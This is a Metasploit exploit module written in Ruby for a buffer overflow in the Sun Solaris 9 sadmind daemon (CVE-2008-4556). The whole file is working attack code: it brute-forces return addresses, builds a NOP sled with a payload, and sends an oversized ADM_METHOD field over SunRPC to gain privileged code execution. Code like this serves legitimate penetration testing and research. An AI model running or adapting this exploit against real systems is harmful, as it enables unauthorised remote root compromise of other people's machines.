##
# $Id: sadmind_adm_build_path.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::SunRPC
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Solaris sadmind adm_build_path() Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow vulnerability in adm_build_path()
				function of sadmind daemon.

				The distributed system administration daemon (sadmind) is the daemon used by
				Solstice AdminSuite applications to perform distributed system administration
				operations.

				The sadmind daemon is started automatically by the inetd daemon whenever a
				request to invoke an operation is received. The sadmind daemon process
				continues to run for 15 minutes after the last request is completed, unless a
				different idle-time is specified with the -i command line option. The sadmind
				daemon may be started independently from the command line, for example, at
				system boot time. In this case, the -i option has no effect; sadmind continues
				to run, even if there are no active requests.
			},
			'Author'         =>
				[
					'Adriano Lima <adriano@risesecurity.org>',
					'ramon',
				],
			'Version'        => '$Revision: 9669 $',
			'Arch'           => ARCH_X86,
			'Platform'       => 'solaris',
			'References'     =>
				[
					['CVE', '2008-4556'],
					['OSVDB', '49111'],
					['URL', 'http://risesecurity.org/advisories/RISE-2008001.txt'],
				],
			'Privileged'     => true,
			'License'        => MSF_LICENSE,
			'Payload'        =>
				{
					'Space' => 1024,
					'BadChars' => "\x00",
				},
			'Targets'       =>
				[
					[
						'Sun Solaris 9 x86 Brute Force',
						{
							'Arch'       => [ ARCH_X86 ],
							'Platform'   => 'solaris',
							'Nops'       => 1024 * 32,
							'Bruteforce' =>
								{
									'Start' => { 'Ret' => 0x08062030 },
									'Stop'  => { 'Ret' => 0x08072030 },
									'Step'  => 1024 * 30,
								}
						}
					],
					[
						'Sun Solaris 9 x86',
						{
							'Nops'       => 1024 * 4,
							'Bruteforce' =>
								{
									'Start' => { 'Ret' => 0x08066a60 + 2048 },
									'Stop'  => { 'Ret' => 0x08066a60 + 2048 },
									'Step'  => 1,
								}
						}
					],
					[
						'Debug',
						{
							'Nops'       => 1024 * 4,
							'Bruteforce' =>
								{
									'Start' => { 'Ret' => 0xaabbccdd },
									'Stop'  => { 'Ret' => 0xaabbccdd },
									'Step'  => 1,
								}
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 14 2008'
		))

	end

	def brute_exploit(brute_target)
		sunrpc_create('udp', 100232, 10)

		unless @nops
			print_status('Creating nop block...')
			if target['Nops'] > 0
				@nops = make_nops(target['Nops'])
			else
				@nops = ''
			end
		end

		print_status("Trying to exploit sadmind with address 0x%.8x..." % brute_target['Ret'])

		hostname = 'localhost'

		# buf1 = rand_text_alpha(1017) + [brute_target['Ret']].pack('L')
		buf1 = "A" * 1017 + [brute_target['Ret']].pack('L')
		buf2 = @nops + payload.encoded

		header =
			XDR.encode(0) * 7 +
			XDR.encode(6, 0, 0, 0, 4, 0, 4, 0x7f000001, 100232, 10, \
				4, 0x7f000001, 100232, 10, 17, 30, 0, 0, 0, 0, \
				hostname, 'system', rand_text_alpha(16))

		body =
			do_int('ADM_FW_VERSION', 1) +
			do_string('ADM_LANG', 'C') +
			do_string('ADM_REQUESTID', '00009:000000000:0') +
			do_string('ADM_CLASS', 'system') +
			do_string('ADM_CLASS_VERS', '2.1') +
			do_string('ADM_METHOD', buf1) +
			do_string('ADM_HOST', hostname) +
			do_string('ADM_CLIENT_HOST', hostname) +
			do_string('ADM_CLIENT_DOMAIN', '') +
			do_string('ADM_TIMEOUT_PARMS', 'TTL=0 PTO=20 PCNT=2 PDLY=30') +
			do_int('ADM_FENCE', 0) +
			do_string('X', buf2) +
			XDR.encode('netmgt_endofargs')

		request = header + XDR.encode(header.length + body.length - 326) + body

		begin
			# two seconds timeout for brute force
			sunrpc_call(1, request, 2)
		rescue Rex::Proto::SunRPC::RPCTimeout
			print_status('Server did not respond, this is expected')
		end

		sunrpc_destroy
		handler
	end

	def do_string(str1, str2)
		XDR.encode(str1, 9, str2.length + 1, str2, 0, 0)
	end

	def do_int(str, int)
		XDR.encode(str, 3, 4, int, 0, 0)
	end

end
